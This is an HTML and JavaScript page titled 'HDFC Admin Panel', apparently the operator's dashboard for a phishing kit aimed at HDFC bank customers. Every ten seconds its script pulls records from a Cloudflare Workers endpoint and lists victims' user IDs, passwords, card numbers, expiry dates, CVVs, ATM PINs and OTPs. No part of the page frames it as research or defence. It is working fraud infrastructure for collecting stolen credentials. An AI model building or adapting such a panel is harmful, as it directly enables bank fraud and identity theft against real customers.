<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HDFC Admin Panel</title>
    <style>
        body { font-family: sans-serif; background: #f0f2f5; margin: 0; padding: 10px; }
        .header { background: #004a8f; color: white; padding: 15px; border-radius: 8px; margin-bottom: 15px; display: flex; justify-content: space-between; align-items: center; }
        .card-row { background: white; border-radius: 10px; padding: 15px; margin-bottom: 10px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); border-left: 5px solid #ed1c24; }
        .info { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; font-size: 13px; }
        .label { color: #666; font-weight: bold; font-size: 11px; text-transform: uppercase; }
        .val { color: #333; font-weight: bold; margin-bottom: 5px; }
        .otp-box { background: #fff5f5; color: #ed1c24; padding: 8px; border-radius: 5px; grid-column: span 2; font-weight: bold; border: 1px dashed #ed1c24; }
        .time { font-size: 10px; color: #999; margin-top: 10px; text-align: right; }
        .refresh-btn { background: #ed1c24; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; }
    </style>
</head>
<body>

<div class="header">
    <h3>LIVE LOGS</h3>
    <button class="refresh-btn" onclick="fetchData()">Refresh</button>
</div>

<div id="logs-container">Loading...</div>

<script>
    // Config
    const WORKER_URL = "https://silent-term-65dc.sumankkuuyy.workers.dev/"; // Apna worker URL yahan dalein
    const KEY = "MY_SECRET_KEY"; // Jo Worker mein set kiya hai

    async function fetchData() {
        try {
            const res = await fetch(`${WORKER_URL}?key=${KEY}`);
            const data = await res.json();
            const container = document.getElementById('logs-container');
            container.innerHTML = "";

            data.forEach(row => {
                const div = document.createElement('div');
                div.className = 'card-row';
                div.innerHTML = `
                    <div class="info">
                        <div><div class="label">User ID</div><div class="val">${row.cust_id}</div></div>
                        <div><div class="label">Password</div><div class="val">${row.password}</div></div>
                        <div><div class="label">Card No</div><div class="val">${row.card_number || '---'}</div></div>
                        <div><div class="label">Exp/CVV/PIN</div><div class="val">${row.expiry || '--'}/${row.cvv || '--'}/${row.atm_pin || '--'}</div></div>
                        <div class="otp-box">OTP LOGS: ${row.otp_logs || 'Waiting...'}</div>
                    </div>
                    <div class="time">${row.created_at}</div>
                `;
                container.appendChild(div);
            });
        } catch (e) {
            document.getElementById('logs-container').innerHTML = "Error loading data.";
        }
    }

    // Auto refresh every 10 seconds
    setInterval(fetchData, 10000);
    fetchData();
</script>

</body>
</html>
